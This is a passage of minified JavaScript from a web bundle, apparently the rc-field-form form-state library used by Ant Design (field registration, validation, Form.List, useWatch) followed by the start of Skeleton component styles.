Promise.all(t.map((t,r)=>oR(`${e}.${r}`,t,i,n,o)))).reduce((e,t)=>[...e,...t],[]);let u={...r,name:e,enum:(r.enum||[]).join(", "),...o};return c.map(e=>{if("string"==typeof e)return e.replace(/\\?\$\{\w+\}/g,e=>e.startsWith("\\")?e.slice(1):u[e.slice(2,-1)]);return e})}async function oA(e){return Promise.all(e).then(e=>[].concat(...e))}async function oD(e){let t=0;return new Promise(r=>{e.forEach(n=>{n.then(n=>{n.errors.length&&r([n]),(t+=1)===e.length&&r([])})})})}function oL(e){return oe(e)}function o_(e,t){let r={};return t.forEach(t=>{let n=O(e,t);r=N(r,t,n)}),r}function oO(e,t,r=!1){return e&&e.some(e=>oN(t,e,r))}function oN(e,t,r=!1){return!!e&&!!t&&(!!r||e.length===t.length)&&t.every((t,r)=>e[r]===t)}function oF(e,t,r){let{length:n}=e;if(t<0||t>=n||r<0||r>=n)return e;let o=e[t],a=t-r;return a>0?[...e.slice(0,r),o,...e.slice(r,t),...e.slice(t+1,n)]:a<0?[...e.slice(0,t),...e.slice(t+1,r+1),o,...e.slice(r+1,n)]:e}let oj=e=>{let t=new MessageChannel;t.port1.onmessage=e,t.port2.postMessage(null)};class oH{namePathList=[];taskId=0;watcherList=new Set;form;constructor(e){this.form=e}register(e){return this.watcherList.add(e),()=>{this.watcherList.delete(e)}}notify(e){e.forEach(e=>{this.namePathList.every(t=>!oN(t,e))&&this.namePathList.push(e)}),this.doBatch()}doBatch(){this.taskId+=1;let e=this.taskId;oj(()=>{if(e===this.taskId&&this.watcherList.size){let e=this.form.getForm(),t=e.getFieldsValue(),r=e.getFieldsValue(!0);this.watcherList.forEach(e=>{e(t,r,this.namePathList)}),this.namePathList=[]}})}}let oB=e=>+setTimeout(e,16),oz=e=>clearTimeout(e);"u">typeof window&&"requestAnimationFrame"in window&&(oB=e=>window.requestAnimationFrame(e),oz=e=>window.cancelAnimationFrame(e));let oV=0,oW=new Map,oU=(e,t=1)=>{let r=oV+=1;return!function t(n){if(0===n)oW.delete(r),e();else{let e=oB(()=>{t(n-1)});oW.set(r,e)}}(t),r};async function oq(){return new Promise(e=>{oj(()=>{oU(()=>{e()})})})}function oG(){return(oG=Object.assign.bind()).apply(this,arguments)}oU.cancel=e=>{let t=oW.get(e);return oW.delete(e),oz(t)},e.s(["default",0,oU],37434);let oJ=[],oX=[];function oK(e,t,r,n,o,a){return"function"==typeof e?e(t,r,"source"in a?{source:a.source}:{}):n!==o}class oQ extends n4.Component{static contextType=n7;state={resetCount:0};cancelRegisterFunc=null;mounted=!1;touched=!1;dirty=!1;validatePromise;prevValidating;errors=oJ;warnings=oX;constructor(e){if(super(e),e.fieldContext){const{getInternalHooks:t}=e.fieldContext,{initEntityValue:r}=t(n5);r(this)}}componentDidMount(){let{shouldUpdate:e,fieldContext:t}=this.props;if(this.mounted=!0,t){let{getInternalHooks:e}=t,{registerField:r}=e(n5);this.cancelRegisterFunc=r(this)}!0===e&&this.reRender()}componentWillUnmount(){this.cancelRegister(),this.triggerMetaEvent(!0),this.mounted=!1}cancelRegister=()=>{let{preserve:e,isListField:t,name:r}=this.props;this.cancelRegisterFunc&&this.cancelRegisterFunc(t,e,oL(r)),this.cancelRegisterFunc=null};getNamePath=()=>{let{name:e,fieldContext:t}=this.props,{prefixName:r=[]}=t;return void 0!==e?[...r,...e]:[]};getRules=()=>{let{rules:e=[],fieldContext:t}=this.props;return e.map(e=>"function"==typeof e?e(t):e)};reRender(){this.mounted&&this.forceUpdate()}refresh=()=>{this.mounted&&this.setState(({resetCount:e})=>({resetCount:e+1}))};metaCache=null;triggerMetaEvent=e=>{let{onMetaChange:t}=this.props;if(t){let r={...this.getMeta(),destroy:e};tp(this.metaCache,r)||t(r),this.metaCache=r}else this.metaCache=null};onStoreChange=(e,t,r)=>{let{shouldUpdate:n,dependencies:o=[],onReset:a}=this.props,{store:i}=r,s=this.getNamePath(),l=this.getValue(e),c=this.getValue(i),u=t&&oO(t,s);switch("valueUpdate"===r.type&&"external"===r.source&&!tp(l,c)&&(this.touched=!0,this.dirty=!0,this.validatePromise=null,this.errors=oJ,this.warnings=oX,this.triggerMetaEvent()),r.type){case"reset":if(!t||u){this.touched=!1,this.dirty=!1,this.validatePromise=void 0,this.errors=oJ,this.warnings=oX,this.triggerMetaEvent(),a?.(),this.refresh();return}break;case"remove":if(n&&oK(n,e,i,l,c,r))return void this.reRender();break;case"setField":{let{data:o}=r;if(u){"touched"in o&&(this.touched=o.touched),"validating"in o&&!("originRCField"in o)&&(this.validatePromise=o.validating?Promise.resolve([]):null),"errors"in o&&(this.errors=o.errors||oJ),"warnings"in o&&(this.warnings=o.warnings||oX),this.dirty=!0,this.triggerMetaEvent(),this.reRender();return}if("value"in o&&oO(t,s,!0)||n&&!s.length&&oK(n,e,i,l,c,r))return void this.reRender();break}case"dependenciesUpdate":if(o.map(oL).some(e=>oO(r.relatedFields,e)))return void this.reRender();break;default:if(u||(!o.length||s.length||n)&&oK(n,e,i,l,c,r))return void this.reRender()}!0===n&&this.reRender()};validateRules=e=>{let t=this.getNamePath(),r=this.getValue(),{triggerName:n,validateOnly:o=!1,delayFrame:a}=e||{},i=Promise.resolve().then(async()=>{if(!this.mounted)return[];let{validateFirst:o=!1,messageVariables:s,validateDebounce:l}=this.props;a&&await oq();let c=this.getRules();if(n&&(c=c.filter(e=>e).filter(e=>{let{validateTrigger:t}=e;return!t||oe(t).includes(n)})),l&&n&&(await new Promise(e=>{setTimeout(e,l)}),this.validatePromise!==i))return[];let u=function(e,t,r,n,o,a){let i,s=e.join("."),l=r.map((e,t)=>{let r=e.validator,n={...e,ruleIndex:t};return r&&(n.validator=(e,t,n)=>{let o=!1,a=r(e,t,(...e)=>{Promise.resolve().then(()=>{G(!o,"Your validator function has already return a promise. `callback` will be ignored."),o||n(...e)})});G(o=a&&"function"==typeof a.then&&"function"==typeof a.catch,"`callback` is deprecated. Please return a promise instead."),o&&a.then(()=>{n()}).catch(e=>{n(e||" ")})}),n}).sort(({warningOnly:e,ruleIndex:t},{warningOnly:r,ruleIndex:n})=>!!e==!!r?t-n:e?1:-1);if(!0===o)i=new Promise(async(e,r)=>{for(let e=0;e<l.length;e+=1){let o=l[e],i=await oR(s,t,o,n,a);if(i.length)return void r([{errors:i,rule:o}])}e([])});else{let e=l.map(e=>oR(s,t,e,n,a).then(t=>({errors:t,rule:e})));i=(o?oD(e):oA(e)).then(e=>Promise.reject(e))}return i.catch(e=>e),i}(t,r,c,e,o,s);return u.catch(e=>e).then((e=oJ)=>{if(this.validatePromise===i){this.validatePromise=null;let t=[],r=[];e.forEach?.(({rule:{warningOnly:e},errors:n=oJ})=>{e?r.push(...n):t.push(...n)}),this.errors=t,this.warnings=r,this.triggerMetaEvent(),this.reRender()}}),u});return o||(this.validatePromise=i,this.dirty=!0,this.errors=oJ,this.warnings=oX,this.triggerMetaEvent(),this.reRender()),i};isFieldValidating=()=>!!this.validatePromise;isFieldTouched=()=>this.touched;isFieldDirty=()=>{if(this.dirty||void 0!==this.props.initialValue)return!0;let{fieldContext:e}=this.props,{getInitialValue:t}=e.getInternalHooks(n5);return void 0!==t(this.getNamePath())};getErrors=()=>this.errors;getWarnings=()=>this.warnings;isListField=()=>this.props.isListField;isList=()=>this.props.isList;isPreserve=()=>this.props.preserve;getMeta=()=>(this.prevValidating=this.isFieldValidating(),{touched:this.isFieldTouched(),validating:this.prevValidating,errors:this.errors,warnings:this.warnings,name:this.getNamePath(),validated:null===this.validatePromise});getOnlyChild=e=>{if("function"==typeof e){let t=this.getMeta();return{...this.getOnlyChild(e(this.getControlled(),t,this.props.fieldContext)),isFunction:!0}}let t=X(e);return 1===t.length&&n4.isValidElement(t[0])?{child:t[0],isFunction:!1}:{child:t,isFunction:!1}};getValue=e=>{let{getFieldsValue:t}=this.props.fieldContext,r=this.getNamePath();return O(e||t(!0),r)};getControlled=(e={})=>{let{name:t,trigger:r="onChange",validateTrigger:n,getValueFromEvent:o,normalize:a,valuePropName:i="value",getValueProps:s,fieldContext:l}=this.props,c=void 0!==n?n:l.validateTrigger,u=this.getNamePath(),{getInternalHooks:d,getFieldsValue:p}=l,{dispatch:m}=d(n5),f=this.getValue(),g=s||(e=>({[i]:e})),h=e[r],b=void 0!==t?g(f):{},y={...e,...b};return y[r]=(...e)=>{let t;this.touched=!0,this.dirty=!0,this.triggerMetaEvent(),t=o?o(...e):function(e,...t){let r=t[0];return r&&r.target&&"object"==typeof r.target&&e in r.target?r.target[e]:r}(i,...e),a&&(t=a(t,f,p(!0))),t!==f&&m({type:"updateValue",namePath:u,value:t}),h&&h(...e)},oe(c||[]).forEach(e=>{let t=y[e];y[e]=(...r)=>{t&&t(...r);let{rules:n}=this.props;n&&n.length&&m({type:"validateField",namePath:u,triggerName:e})}}),y};render(){let e,{resetCount:t}=this.state,{children:r}=this.props,{child:n,isFunction:o}=this.getOnlyChild(r);return o?e=n:n4.isValidElement(n)?e=n4.cloneElement(n,this.getControlled(n.props)):(G(!n,"`children` of Field is not validate ReactElement."),e=n),n4.createElement(n4.Fragment,{key:t},e)}}let oY=function({name:e,...t}){let r=n4.useContext(n7),n=n4.useContext(n9),o=void 0!==e?oL(e):void 0,a=t.isListField??!!n,i="keep";return a||(i=`_${(o||[]).join("_")}`),n4.createElement(oQ,oG({key:i,name:o,isListField:a},t,{fieldContext:r}))},oZ="__@field_split__";function o0(e){return e.map(e=>`${typeof e}:${e}`).join(oZ)}class o1{kvs=new Map;set(e,t){this.kvs.set(o0(e),t)}get(e){return this.kvs.get(o0(e))}getAsPrefix(e){let t=o0(e),r=t+oZ,n=[],o=this.kvs.get(t);return void 0!==o&&n.push(o),this.kvs.forEach((e,t)=>{t.startsWith(r)&&n.push(e)}),n}update(e,t){let r=t(this.get(e));r?this.set(e,r):this.delete(e)}delete(e){this.kvs.delete(o0(e))}map(e){return[...this.kvs.entries()].map(([t,r])=>e({key:t.split(oZ).map(e=>{let[,t,r]=e.match(/^([^:]*):(.*)$/);return"number"===t?Number(r):r}),value:r}))}toJSON(){let e={};return this.map(({key:t,value:r})=>(e[t.join(".")]=r,null)),e}}class o2{formHooked=!1;forceRootUpdate;subscribable=!0;store={};fieldEntities=[];initialValues={};callbacks={};validateMessages=null;preserve=null;lastValidatePromise=null;watcherCenter=new oH(this);constructor(e){this.forceRootUpdate=e}getForm=()=>({getFieldValue:this.getFieldValue,getFieldsValue:this.getFieldsValue,getFieldError:this.getFieldError,getFieldWarning:this.getFieldWarning,getFieldsError:this.getFieldsError,isFieldsTouched:this.isFieldsTouched,isFieldTouched:this.isFieldTouched,isFieldValidating:this.isFieldValidating,isFieldsValidating:this.isFieldsValidating,resetFields:this.resetFields,setFields:this.setFields,setFieldValue:this.setFieldValue,setFieldsValue:this.setFieldsValue,validateFields:this.validateFields,submit:this.submit,_init:!0,getInternalHooks:this.getInternalHooks});getInternalHooks=e=>e===n5?(this.formHooked=!0,{dispatch:this.dispatch,initEntityValue:this.initEntityValue,registerField:this.registerField,useSubscribe:this.useSubscribe,setInitialValues:this.setInitialValues,destroyForm:this.destroyForm,setCallbacks:this.setCallbacks,setValidateMessages:this.setValidateMessages,getFields:this.getFields,setPreserve:this.setPreserve,getInitialValue:this.getInitialValue,registerWatch:this.registerWatch}):(G(!1,"`getInternalHooks` is internal usage. Should not call directly."),null);useSubscribe=e=>{this.subscribable=e};prevWithoutPreserves=null;setInitialValues=(e,t)=>{if(this.initialValues=e||{},t){let t=B(e,this.store);this.prevWithoutPreserves?.map(({key:r})=>{t=N(t,r,O(e,r))}),this.prevWithoutPreserves=null,this.updateStore(t)}};destroyForm=e=>{if(e)this.updateStore({});else{let e=new o1;this.getFieldEntities(!0).forEach(t=>{this.isMergedPreserve(t.isPreserve())||e.set(t.getNamePath(),!0)}),this.prevWithoutPreserves=e}};getInitialValue=e=>{let t=O(this.initialValues,e);return e.length?B(t):t};setCallbacks=e=>{this.callbacks=e};setValidateMessages=e=>{this.validateMessages=e};setPreserve=e=>{this.preserve=e};registerWatch=e=>this.watcherCenter.register(e);notifyWatch=(e=[])=>{this.watcherCenter.notify(e)};timeoutId=null;warningUnhooked=()=>{};updateStore=e=>{this.store=e};getFieldEntities=(e=!1)=>e?this.fieldEntities.filter(e=>e.getNamePath().length):this.fieldEntities;getFieldsMap=(e=!1)=>{let t=new o1;return this.getFieldEntities(e).forEach(e=>{let r=e.getNamePath();t.set(r,e)}),t};getFieldEntitiesForNamePathList=(e,t=!1)=>{if(!e)return this.getFieldEntities(!0);let r=this.getFieldsMap(!0);return t?e.flatMap(e=>{let t=oL(e),n=r.getAsPrefix(t);return n.length?n:[{INVALIDATE_NAME_PATH:t}]}):e.map(e=>{let t=oL(e);return r.get(t)||{INVALIDATE_NAME_PATH:oL(e)}})};getFieldsValue=(e,t)=>{let r,n;if(this.warningUnhooked(),!0===e||Array.isArray(e)?(r=e,n=t):e&&"object"==typeof e&&(n=e.filter),!0===r&&!n)return this.store;let o=this.getFieldEntitiesForNamePathList(Array.isArray(r)?r:null,!0),a=[],i=[];o.forEach(e=>{let t=e.INVALIDATE_NAME_PATH||e.getNamePath();if(e.isList?.())return void i.push(t);if(n){let r="getMeta"in e?e.getMeta():null;n(r)&&a.push(t)}else a.push(t)});let s=o_(this.store,a.map(oL));return i.forEach(e=>{O(s,e)||(s=N(s,e,[]))}),s};getFieldValue=e=>{this.warningUnhooked();let t=oL(e);return O(this.store,t)};getFieldsError=e=>(this.warningUnhooked(),this.getFieldEntitiesForNamePathList(e).map((t,r)=>t&&!t.INVALIDATE_NAME_PATH?{name:t.getNamePath(),errors:t.getErrors(),warnings:t.getWarnings()}:{name:oL(e[r]),errors:[],warnings:[]}));getFieldError=e=>{this.warningUnhooked();let t=oL(e);return this.getFieldsError([t])[0].errors};getFieldWarning=e=>{this.warningUnhooked();let t=oL(e);return this.getFieldsError([t])[0].warnings};isFieldsTouched=(...e)=>{let t;this.warningUnhooked();let[r,n]=e,o=!1;0===e.length?t=null:1===e.length?Array.isArray(r)?(t=r.map(oL),o=!1):(t=null,o=r):(t=r.map(oL),o=n);let a=this.getFieldEntities(!0),i=e=>e.isFieldTouched();if(!t)return o?a.every(e=>i(e)||e.isList()):a.some(i);let s=new o1;t.forEach(e=>{s.set(e,[])}),a.forEach(e=>{let r=e.getNamePath();t.forEach(t=>{t.every((e,t)=>r[t]===e)&&s.update(t,t=>[...t,e])})});let l=e=>e.some(i),c=s.map(({value:e})=>e);return o?c.every(l):c.some(l)};isFieldTouched=e=>(this.warningUnhooked(),this.isFieldsTouched([e]));isFieldsValidating=e=>{this.warningUnhooked();let t=this.getFieldEntities();if(!e)return t.some(e=>e.isFieldValidating());let r=e.map(oL);return t.some(e=>oO(r,e.getNamePath())&&e.isFieldValidating())};isFieldValidating=e=>(this.warningUnhooked(),this.isFieldsValidating([e]));resetWithFieldInitialValue=(e={})=>{let t,r=new o1,n=this.getFieldEntities(!0);n.forEach(e=>{let{initialValue:t}=e.props,n=e.getNamePath();if(void 0!==t){let o=r.get(n)||new Set;o.add({entity:e,value:t}),r.set(n,o)}});let o=t=>{t.forEach(t=>{let{initialValue:n}=t.props;if(void 0!==n){let n=t.getNamePath();if(void 0!==this.getInitialValue(n))G(!1,`Form already set 'initialValues' with path '${n.join(".")}'. Field can not overwrite it.`);else{let o=r.get(n);if(o&&o.size>1)G(!1,`Multiple Field with path '${n.join(".")}' set 'initialValue'. Can not decide which one to pick.`);else if(o){let r=this.getFieldValue(n);t.isListField()||e.skipExist&&void 0!==r||this.updateStore(N(this.store,n,[...o][0].value))}}}})};e.entities?t=e.entities:e.namePathList?(t=[],e.namePathList.forEach(e=>{let n=r.get(e);n&&t.push(...[...n].map(e=>e.entity))})):t=n,o(t)};resetFields=e=>{this.warningUnhooked();let t=this.store;if(!e){this.updateStore(B(this.initialValues)),this.resetWithFieldInitialValue(),this.notifyObservers(t,null,{type:"reset"}),this.notifyWatch();return}let r=e.map(oL);r.forEach(e=>{let t=this.getInitialValue(e);this.updateStore(N(this.store,e,t))}),this.resetWithFieldInitialValue({namePathList:r}),this.notifyObservers(t,r,{type:"reset"}),this.notifyWatch(r)};setFields=e=>{this.warningUnhooked();let t=this.store,r=[];e.forEach(e=>{let{name:n,...o}=e,a=oL(n);r.push(a),"value"in o&&this.updateStore(N(this.store,a,o.value)),this.notifyObservers(t,[a],{type:"setField",data:e})}),this.notifyWatch(r)};getFields=()=>this.getFieldEntities(!0).map(e=>{let t=e.getNamePath(),r={...e.getMeta(),name:t,value:this.getFieldValue(t)};return Object.defineProperty(r,"originRCField",{value:!0}),r});initEntityValue=e=>{let{initialValue:t}=e.props;if(void 0!==t){let r=e.getNamePath();void 0===O(this.store,r)&&this.updateStore(N(this.store,r,t))}};isMergedPreserve=e=>(void 0!==e?e:this.preserve)??!0;registerField=e=>{this.fieldEntities.push(e);let t=e.getNamePath();if(this.notifyWatch([t]),void 0!==e.props.initialValue){let t=this.store;this.resetWithFieldInitialValue({entities:[e],skipExist:!0}),this.notifyObservers(t,[e.getNamePath()],{type:"valueUpdate",source:"internal"})}return(r,n,o=[])=>{if(this.fieldEntities=this.fieldEntities.filter(t=>t!==e),!this.isMergedPreserve(n)&&(!r||o.length>1)){let e=r?void 0:this.getInitialValue(t);if(t.length&&this.getFieldValue(t)!==e&&this.fieldEntities.every(e=>!oN(e.getNamePath(),t))){let r=this.store;this.updateStore(N(r,t,e,!0)),this.notifyObservers(r,[t],{type:"remove"}),this.triggerDependenciesUpdate(r,t)}}this.notifyWatch([t])}};dispatch=e=>{switch(e.type){case"updateValue":{let{namePath:t,value:r}=e;this.updateValue(t,r);break}case"validateField":{let{namePath:t,triggerName:r}=e;this.validateFields([t],{triggerName:r})}}};notifyObservers=(e,t,r)=>{if(this.subscribable){let n={...r,store:this.getFieldsValue(!0)};this.getFieldEntities().forEach(({onStoreChange:r})=>{r(e,t,n)})}else this.forceRootUpdate()};triggerDependenciesUpdate=(e,t)=>{let r=this.getDependencyChildrenFields(t);return r.length&&this.validateFields(r,{delayFrame:!0}),this.notifyObservers(e,r,{type:"dependenciesUpdate",relatedFields:[t,...r]}),r};updateValue=(e,t)=>{let r=oL(e),n=this.store;this.updateStore(N(this.store,r,t)),this.notifyObservers(n,[r],{type:"valueUpdate",source:"internal"}),this.notifyWatch([r]);let o=this.triggerDependenciesUpdate(n,r),{onValuesChange:a}=this.callbacks;if(a){let e=this.getFieldsMap(!0).get(r),t=o_(this.store,[r]),n=H([this.getFieldsValue(),t],{prepareArray:t=>e?.isList()?[]:[...t||[]]});a(t,n)}this.triggerOnFieldsChange([r,...o])};setFieldsValue=e=>{this.warningUnhooked();let t=this.store;if(e){let t=B(this.store,e);this.updateStore(t)}this.notifyObservers(t,null,{type:"valueUpdate",source:"external"}),this.notifyWatch()};setFieldValue=(e,t)=>{this.setFields([{name:e,value:t,errors:[],warnings:[],touched:!0}])};getDependencyChildrenFields=e=>{let t=new Set,r=[],n=new o1;this.getFieldEntities().forEach(e=>{let{dependencies:t}=e.props;(t||[]).forEach(t=>{let r=oL(t);n.update(r,(t=new Set)=>(t.add(e),t))})});let o=e=>{(n.get(e)||new Set).forEach(e=>{if(!t.has(e)){t.add(e);let n=e.getNamePath();e.isFieldDirty()&&n.length&&(r.push(n),o(n))}})};return o(e),r};triggerOnFieldsChange=(e,t)=>{let{onFieldsChange:r}=this.callbacks;if(r){let n=this.getFields();if(t){let e=new o1;t.forEach(({name:t,errors:r})=>{e.set(t,r)}),n.forEach(t=>{t.errors=e.get(t.name)||t.errors})}let o=n.filter(({name:t})=>oO(e,t));o.length&&r(o,n)}};validateFields=(e,t)=>{let r,n,o,a,i;this.warningUnhooked(),Array.isArray(e)||"string"==typeof e||"string"==typeof t?(r=e,n=t):n=e;let s=!!r,l=s?r.map(oL):[],c=[...l],u=[],d=String(Date.now()),p=new Set,{recursive:m,dirty:f}=n||{};this.getFieldEntities(!0).forEach(e=>{let t=e.getNamePath();if((s||(e.isList()&&l.some(e=>oN(e,t,!0))||c.push(t),l.push(t)),e.props.rules&&e.props.rules.length)&&(!f||e.isFieldDirty())&&(p.add(t.join(d)),!s||oO(l,t,m))){let r=e.validateRules({validateMessages:{...oI,...this.validateMessages},...n});u.push(r.then(()=>({name:t,errors:[],warnings:[]})).catch(e=>{let r=[],n=[];return(e.forEach?.(({rule:{warningOnly:e},errors:t})=>{e?n.push(...t):r.push(...t)}),r.length)?Promise.reject({name:t,errors:r,warnings:n}):{name:t,errors:r,warnings:n}}))}});let g=(o=!1,a=u.length,i=[],u.length?new Promise((e,t)=>{u.forEach((r,n)=>{r.catch(e=>(o=!0,e)).then(r=>{a-=1,i[n]=r,a>0||(o&&t(i),e(i))})})}):Promise.resolve([]));this.lastValidatePromise=g,g.catch(e=>e).then(e=>{let t=e.map(({name:e})=>e);this.notifyObservers(this.store,t,{type:"validateFinish"}),this.triggerOnFieldsChange(t,e)});let h=g.then(()=>this.lastValidatePromise===g?Promise.resolve(this.getFieldsValue(c)):Promise.reject([])).catch(e=>{let t=e.filter(e=>e&&e.errors.length);return Promise.reject({message:t[0]?.errors?.[0],values:this.getFieldsValue(l),errorFields:t,outOfDate:this.lastValidatePromise!==g})});h.catch(e=>e);let b=l.filter(e=>p.has(e.join(d)));return this.triggerOnFieldsChange(b),h};submit=()=>{this.warningUnhooked(),this.validateFields().then(e=>{let{onFinish:t}=this.callbacks;if(t)try{t(e)}catch(e){console.error(e)}}).catch(e=>{let{onFinishFailed:t}=this.callbacks;t&&t(e)})}}let o3=function(e){let t=b.useRef(null),[,r]=b.useState({});return t.current||(e?t.current=e:t.current=new o2(()=>{r({})}).getForm()),[t.current]},o6=b.createContext({triggerFormChange:()=>{},triggerFormFinish:()=>{},registerForm:()=>{},unregisterForm:()=>{}});function o4(){return(o4=Object.assign.bind()).apply(this,arguments)}function o5(e){try{return JSON.stringify(e)}catch{return Math.random()}}e.s(["useEvent",0,y],80251);let o8=b.forwardRef(({name:e,initialValues:t,fields:r,form:n,preserve:o,children:a,component:i="form",validateMessages:s,validateTrigger:l="onChange",onValuesChange:c,onFieldsChange:u,onFinish:d,onFinishFailed:p,clearOnDestroy:m,...f},g)=>{let h,y=b.useRef(null),v=b.useContext(o6),[S]=o3(n),{useSubscribe:x,setInitialValues:C,setCallbacks:w,setValidateMessages:k,setPreserve:$,destroyForm:E}=S.getInternalHooks(n5);b.useImperativeHandle(g,()=>({...S,nativeElement:y.current})),b.useEffect(()=>(v.registerForm(e,S),()=>{v.unregisterForm(e)}),[v,S,e]),k({...v.validateMessages,...s}),w({onValuesChange:c,onFieldsChange:(t,...r)=>{v.triggerFormChange(e,t),u&&u(t,...r)},onFinish:t=>{v.triggerFormFinish(e,t),d&&d(t)},onFinishFailed:p}),$(o);let P=b.useRef(null);C(t,!P.current),P.current||(P.current=!0),b.useEffect(()=>()=>E(m),[]);let T="function"==typeof a;h=T?a(S.getFieldsValue(!0),S):a,x(!T);let I=b.useRef(null);b.useEffect(()=>{var e,t;e=I.current||[],e===(t=r||[])||(e||!t)&&(!e||t)&&e&&t&&"object"==typeof e&&"object"==typeof t&&[...new Set([...Object.keys(e),...Object.keys(t)])].every(r=>{let n=e[r],o=t[r];return"function"==typeof n&&"function"==typeof o||n===o})||S.setFields(r||[]),I.current=r},[r,S]);let M=b.useMemo(()=>({...S,validateTrigger:l}),[S,l]),R=b.createElement(n9.Provider,{value:null},b.createElement(n7.Provider,{value:M},h));return!1===i?R:b.createElement(i,o4({},f,{ref:y,onSubmit:e=>{e.preventDefault(),e.stopPropagation(),S.submit()},onReset:e=>{e.preventDefault(),S.resetFields(),f.onReset?.(e)}}),R)});o8.FormProvider=({validateMessages:e,onFormChange:t,onFormFinish:r,children:n})=>{let o=b.useContext(o6),a=b.useRef({});return b.createElement(o6.Provider,{value:{...o,validateMessages:{...o.validateMessages,...e},triggerFormChange:(e,r)=>{t&&t(e,{changedFields:r,forms:a.current}),o.triggerFormChange(e,r)},triggerFormFinish:(e,t)=>{r&&r(e,{values:t,forms:a.current}),o.triggerFormFinish(e,t)},registerForm:(e,t)=>{e&&(a.current={...a.current,[e]:t}),o.registerForm(e,t)},unregisterForm:e=>{let t={...a.current};delete t[e],a.current=t,o.unregisterForm(e)}}},n)},o8.Field=oY,o8.List=function({name:e,initialValue:t,children:r,rules:n,validateTrigger:o,isListField:a}){let i=b.useContext(n7),s=b.useContext(n9),l=b.useRef({keys:[],id:0}).current,c=b.useMemo(()=>[...oL(i.prefixName)||[],...oL(e)],[i.prefixName,e]),u=b.useMemo(()=>({...i,prefixName:c}),[i,c]),d=b.useMemo(()=>({getKey:e=>{let t=c.length,r=e[t];return[l.keys[r],e.slice(t+1)]}}),[l,c]);return"function"!=typeof r?(G(!1,"Form.List only accepts function as children."),null):b.createElement(n9.Provider,{value:d},b.createElement(n7.Provider,{value:u},b.createElement(oY,{name:[],shouldUpdate:(e,t,{source:r})=>"internal"!==r&&e!==t,rules:n,validateTrigger:o,initialValue:t,isList:!0,isListField:a??!!s},({value:e=[],onChange:t},n)=>{let{getFieldValue:o}=i,a=()=>o(c||[])||[],s=e||[];return Array.isArray(s)||(s=[]),r(s.map((e,t)=>{let r=l.keys[t];return void 0===r&&(l.keys[t]=l.id,r=l.keys[t],l.id+=1),{name:t,key:r,isListField:!0}}),{add:(e,r)=>{let n=a();r>=0&&r<=n.length?(l.keys=[...l.keys.slice(0,r),l.id,...l.keys.slice(r)],t([...n.slice(0,r),e,...n.slice(r)])):(l.keys=[...l.keys,l.id],t([...n,e])),l.id+=1},remove:e=>{let r=a(),n=new Set(Array.isArray(e)?e:[e]);n.size<=0||(l.keys=l.keys.filter((e,t)=>!n.has(t)),t(r.filter((e,t)=>!n.has(t))))},move(e,r){if(e===r)return;let n=a();e<0||e>=n.length||r<0||r>=n.length||(l.keys=oF(l.keys,e,r),t(oF(n,e,r)))}},n)})))},o8.useForm=o3,o8.useWatch=function(...e){let[t,r={}]=e,n=r&&r._init?{form:r}:r,o=n.form,[a,i]=(0,b.useState)(()=>"function"==typeof t?t({}):void 0),s=(0,b.useMemo)(()=>o5(a),[a]);(0,b.useRef)(s).current=s;let l=(0,b.useContext)(n7),c=o||l,u=c&&c._init,{getFieldsValue:d,getInternalHooks:p}=c,{registerWatch:m}=p(n5),f=y((e,r)=>{let o=n.preserve?r??d(!0):e??d(),s="function"==typeof t?t(o):O(o,oL(t));o5(a)!==o5(s)&&i(s)}),g="function"==typeof t?t:JSON.stringify(t);return(0,b.useEffect)(()=>{u&&f()},[u,g]),(0,b.useEffect)(()=>{if(u)return m((e,t)=>{f(e,t)})},[u]),a};let o7=b.createContext({}),o9=b.createContext(void 0);e.s(["FormItemInputContext",0,o7,"NoFormStyle",0,({children:e,status:t,override:r})=>{let n=b.useContext(o7),o=b.useMemo(()=>{let e={...n};return r&&delete e.isFormItemInput,t&&(delete e.status,delete e.hasFeedback,delete e.feedbackIcon),e},[t,r,n]);return b.createElement(o7.Provider,{value:o},e)},"VariantContext",0,o9],62139);let ae=(e,t,r)=>{let n,{variant:o,[e]:a}=b.useContext(ee),i=b.useContext(o9),s=a?.variant;n=void 0!==t?t:!1===r?"borderless":i??s??o??"outlined";let l=Z.includes(n);return[n,l]};e.s(["default",0,ae],92812);let at=e=>{let{prefixCls:t,className:r,style:n,size:o,shape:a}=e,i=K({[`${t}-lg`]:"large"===o,[`${t}-sm`]:"small"===o}),s=K({[`${t}-circle`]:"circle"===a,[`${t}-square`]:"square"===a,[`${t}-round`]:"round"===a}),l=b.useMemo(()=>"number"==typeof o?{width:o,height:o,lineHeight:`${o}px`}:{},[o]);return b.createElement("span",{className:K(t,i,s,r),style:{...l,...n}})};e.s(["Keyframes",0,rD],94758),e.s(["mergeToken",()=>r8],38378);let ar=new rD("ant-skeleton-loading",{"0%":{backgroundPosition:"100% 50%"},"100%":{backgroundPosition:"0 50%"}}),an=e=>({height:e,lineHeight:tj(e)}),ao=e=>({width:e,...an(e)}),aa=(e,t)=>({width:t(e).mul(5).equal(),minWidth:t(e).mul(5).equal(),...an(e)}),ai=e=>{let{gradientFromColor:t,borderRadiusSM:r,imageSizeBase:n,calc:o}=e;return{display:"inline-flex",alignItems:"center",justifyContent:"center",verticalAlign:"middle",background:t,borderRadius:r,...ao(o(n).mul(2).equal())}},as=(e,t,r)=>{let{skeletonButtonCls:n}=e;return{[`${r}${n}-circle`]:{width:t,minWidth:t,borderRadius:"50%"},[`${r}${n}-round`]:{borderRadius:t}}},al=(e,t)=>({width:t(e).mul(2).equal(),minWidth:t(e).mul(2).equal(),...an(e)}),ac=nA("Skeleton",e=>{let{componentCls:t,calc:r}=e;return(e=>{let{componentCls:t,skeletonAvatarCls:r,skeletonTitleCls:n,skeletonParagraphCls:o,skeletonButtonCls:a,skeletonInputCls:i,skeletonNodeCls:s,skeletonImageCls:l,controlHeight:c,controlHeightLG:u,controlHeightSM:d,gradientFromColor:p,padding:m,marginSM:f,borderRadius:g,titleHeight:h,blockRadius:b,paragraphLiHeight:y,controlHeightXS:v,paragraphMarginTop:S}=e;return{[t]:{display:"table",width:"100%",[`${t}-header`]:{display:"table-cell",paddingInlineEnd:m,verticalAlign:"top",[r]:{display:"inline-block",verticalAlign:"top",background:p,...ao(c)},[`${r}-circle`]:{borderRadius:"50%"},[`${r}-lg`]:{...ao(u)},[`${r}-sm`]:{...ao(d)}},[`${t}-section`]:{display:"table-cell",width:"100%",verticalAlign:"top",[n]:{width:"100%",height:h,background:p,borderRadius:b,[`+ ${o}`]:{marginBlockStart:d}},[o]:{padding:0,"> li":{width:"100%",height:y,listStyle:"none",background:p,borderRadius:b,"+ li":{marginBlockStart:v}}},[`${o}> 